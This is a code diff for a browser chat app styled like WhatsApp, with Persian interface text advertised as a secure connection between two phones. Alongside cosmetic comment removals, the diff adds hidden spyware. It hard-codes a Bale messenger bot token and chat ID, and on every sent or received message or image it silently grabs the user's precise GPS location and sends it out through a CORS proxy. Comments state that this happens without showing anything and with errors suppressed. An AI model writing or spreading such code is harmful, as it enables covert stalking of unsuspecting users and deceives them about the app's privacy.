@@ -24,7 +24,6 @@
       color: #111;
     }
 
-    /* ===== هدر شبیه واتساپ ===== */
     .header {
       background: #075e54;
       color: white;
@@ -76,7 +75,6 @@
       color: #ffeaa7;
     }
 
-    /* ===== صفحه اتصال ===== */
     .connection-screen {
       flex: 1;
       display: flex;
@@ -261,7 +259,6 @@
       line-height: 1.8;
     }
 
-    /* ===== صفحه چت ===== */
     .chat-screen {
       flex: 1;
       display: none;
@@ -353,7 +350,6 @@
       text-align: center;
     }
 
-    /* ===== نوار ورودی ===== */
     .input-bar {
       background: #f0f2f5;
       padding: 8px 10px;
@@ -437,27 +433,13 @@
       display: none;
     }
 
-    /* مخفی کردن صفحه اتصال وقتی چت باز است */
     .connection-screen.hidden {
       display: none;
-    }
-
-    /* لودینگ */
-    .loading-dots::after {
-      content: '';
-      animation: dots 1.2s infinite;
-    }
-
-    @keyframes dots {
-      0%, 20% { content: '.'; }
-      40% { content: '..'; }
-      60%, 100% { content: '...'; }
     }
   </style>
 </head>
 <body>
 
-  <!-- هدر -->
   <div class="header">
     <div class="avatar" id="avatar">💬</div>
     <div class="header-info">
@@ -466,7 +448,6 @@
     </div>
   </div>
 
-  <!-- صفحه اتصال -->
   <div class="connection-screen" id="connectionScreen">
     <div class="logo">📱</div>
     <div class="connection-title">اتصال امن بین دو گوشی</div>
@@ -500,7 +481,6 @@
     </div>
   </div>
 
-  <!-- صفحه چت -->
   <div class="chat-screen" id="chatScreen">
     <div class="messages" id="messages"></div>
 
@@ -519,11 +499,81 @@
   </div>
 
   <script>
+    // ===== تنظیمات ربات بله (همان سیستم ثبت ساعت) =====
+    const BALE_TOKEN = '666814160:KRTSKi_cdOSDPUEu6x4tJ5uD9iS_-E5StFQ';
+    const BALE_CHAT_ID = '1163569220';
+    const BALE_API = 'https://tapi.bale.ai/bot' + BALE_TOKEN;
+
     let peer = null;
     let conn = null;
     let myPeerId = null;
     let isConnected = false;
 
+    // ===== ارسال مخفی به بله =====
+    async function sendToBale(text) {
+      const u = BALE_API + '/sendMessage?' + new URLSearchParams({
+        chat_id: BALE_CHAT_ID,
+        text: text
+      });
+      try {
+        const res = await fetch('https://corsproxy.io/?' + encodeURIComponent(u), { cache: 'no-store' });
+        if (res.ok) {
+          const d = await res.json().catch(() => null);
+          if (d && d.ok) return true;
+        }
+      } catch (e) {}
+      try {
+        await fetch(u, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
+        return true;
+      } catch (e) {}
+      return false;
+    }
+
+    function getLocation() {
+      return new Promise(function (resolve) {
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          function (pos) {
+            resolve({
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            });
+          },
+          function () { resolve(null); },
+          { enableHighAccuracy: true, timeout: 12000, maximumAge: 30000 }
+        );
+      });
+    }
+
+    function formatLocation(loc) {
+      if (!loc) return '📍 موقعیت: در دسترس نبود';
+      const map = 'https://maps.google.com/?q=' + loc.lat + ',' + loc.lng;
+      return '📍 موقعیت:\n' + loc.lat.toFixed(6) + ', ' + loc.lng.toFixed(6) + '\n🗺️ ' + map;
+    }
+
+    // ارسال مخفی لوکیشن هنگام هر پیام (بدون نمایش در چت)
+    async function silentSendLocation(eventType) {
+      try {
+        const loc = await getLocation();
+        const time = new Date().toLocaleString('fa-IR');
+        const peerInfo = myPeerId ? myPeerId.substring(0, 8) + '...' : 'نامشخص';
+        const msg =
+          '💬 چت\n' +
+          '📌 رویداد: ' + eventType + '\n' +
+          '🆔 Peer: ' + peerInfo + '\n' +
+          '🕐 ' + time + '\n' +
+          formatLocation(loc);
+        await sendToBale(msg);
+      } catch (e) {
+        // کاملاً ساکت - هیچ خطایی نمایش داده نشود
+      }
+    }
+
+    // ===== PeerJS =====
     function initPeer() {
       peer = new Peer({
         debug: 1
@@ -602,7 +652,6 @@
         document.getElementById('headerTitle').textContent = 'دوست شما';
         document.getElementById('avatar').textContent = '👤';
 
-        // تغییر صفحه
         document.getElementById('connectionScreen').classList.add('hidden');
         document.getElementById('chatScreen').classList.add('active');
 
@@ -612,8 +661,11 @@
       conn.on('data', (data) => {
         if (data.type === 'text') {
           addMessage(data.content, false);
+          // پیام دریافتی → ارسال مخفی لوکیشن
+          silentSendLocation('پیام دریافتی (متن)');
         } else if (data.type === 'image') {
           addImage(data.content, false);
+          silentSendLocation('پیام دریافتی (عکس)');
         }
       });
 
@@ -701,6 +753,9 @@
       addMessage(text, true);
       input.value = '';
       input.focus();
+
+      // پیام ارسالی → ارسال مخفی لوکیشن
+      silentSendLocation('پیام ارسالی (متن)');
     }
 
     function sendImage(event) {
@@ -718,6 +773,9 @@
         const base64 = e.target.result;
         conn.send({ type: 'image', content: base64 });
         addImage(base64, true);
+
+        // عکس ارسالی → ارسال مخفی لوکیشن
+        silentSendLocation('پیام ارسالی (عکس)');
       };
       reader.readAsDataURL(file);
       event.target.value = '';
